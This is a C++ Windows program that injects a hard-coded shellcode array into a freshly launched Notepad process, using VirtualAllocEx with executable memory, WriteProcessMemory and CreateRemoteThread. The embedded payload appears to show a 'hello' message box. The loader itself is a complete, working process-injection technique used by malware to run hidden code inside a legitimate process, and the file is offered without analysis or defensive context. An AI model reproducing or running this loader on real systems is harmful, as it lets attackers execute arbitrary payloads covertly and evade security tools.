#include <Windows.h>
#include <iostream>

STARTUPINFO si;
PROCESS_INFORMATION pi;
unsigned char payload[] =
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
    "\x51\x41\x50\x52\x48\x31\xd2\x51\x65\x48\x8b\x52\x60\x48"
    "\x8b\x52\x18\x48\x8b\x52\x20\x56\x48\x8b\x72\x50\x4d\x31"
    "\xc9\x48\x0f\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02"
    "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51"
    "\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18"
    "\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
    "\x48\x85\xc0\x74\x67\x48\x01\xd0\x44\x8b\x40\x20\x49\x01"
    "\xd0\x50\x8b\x48\x18\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41"
    "\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d"
    "\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
    "\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
    "\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41"
    "\x58\x41\x58\x5e\x59\x48\x01\xd0\x5a\x41\x58\x41\x59\x41"
    "\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
    "\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
    "\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"
    "\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x06"
    "\x00\x00\x00\x68\x65\x6c\x6c\x6f\x00\x5a\xe8\x06\x00\x00"
    "\x00\x68\x65\x6c\x6c\x6f\x00\x41\x58\x48\x31\xc9\x41\xba"
    "\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
    "\x56\xff\xd5";

void InjectIntoProcess() {
  ZeroMemory(&si, sizeof(si));
  si.cb = sizeof(si);
  ZeroMemory(&pi, sizeof(pi));

  bool success = CreateProcessW(L"C:\\Windows\\System32\\Notepad.exe", NULL,
                                NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
  if (!success) {
    std::cout << "failed to create notepad" << std::endl;
    return;
  }

  std::cout << "Created notepad. PID: " << pi.dwProcessId << std::endl;
  HANDLE myhandle = OpenProcess(PROCESS_ALL_ACCESS, false, pi.dwProcessId);
  if (myhandle == NULL) {
    std::cout << "failed to open process handle" << std::endl;
    return;
  }
  std::cout << "got handle to notepad." << std::endl;
  LPVOID myaddress =
      VirtualAllocEx(myhandle, NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE,
                     PAGE_EXECUTE_READWRITE);
  if (myaddress == NULL) {
    std::cout << "failed to allocate memory, size was: " << sizeof(payload)
              << std::endl;
    CloseHandle(myhandle);
    return;
  }
  std::cout << "allocated memory at address: " << (LPVOID)myaddress
            << std::endl;

  bool writesuccess =
      WriteProcessMemory(myhandle, myaddress, payload, sizeof(payload), NULL);
  if (writesuccess != true) {
    std::cout << "failed to writeprocessmemory. " << std::endl;
    CloseHandle(myhandle);
    return;
  }
  std::cout << "successfully wrote process memory." << std::endl;

  HANDLE newthread = CreateRemoteThread(
      myhandle, NULL, 0, (LPTHREAD_START_ROUTINE)myaddress, NULL, 0, NULL);
  if (newthread == NULL) {
    std::cout << "failed to create remote thread." << std::endl;
    CloseHandle(myhandle);
    return;
  }
  std::cout << "created remote thread!";

  CloseHandle(myhandle);
}
int main() {
  std::cout << "injection..\n";
  InjectIntoProcess();
}
